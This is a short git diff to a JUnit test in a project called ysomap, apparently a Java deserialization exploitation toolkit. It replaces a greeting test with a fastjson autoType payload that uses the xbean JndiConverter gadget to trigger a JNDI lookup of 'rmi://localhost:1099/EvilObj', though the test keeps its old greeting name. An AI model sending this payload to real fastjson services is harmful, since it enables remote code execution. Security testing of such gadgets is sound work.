@@ -3,11 +3,14 @@
  */
 package ysomap;
 
+import com.alibaba.fastjson.JSON;
 import org.junit.Test;
-import static org.junit.Assert.*;
 
 public class AppTest {
     @Test public void testAppHasAGreeting() {
-        App classUnderTest = new App();
+        String jsonObject =
+                "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
+                        "\"asText\":\"rmi://localhost:1099/EvilObj\"}";
+        JSON.parseObject(jsonObject);
     }
 }
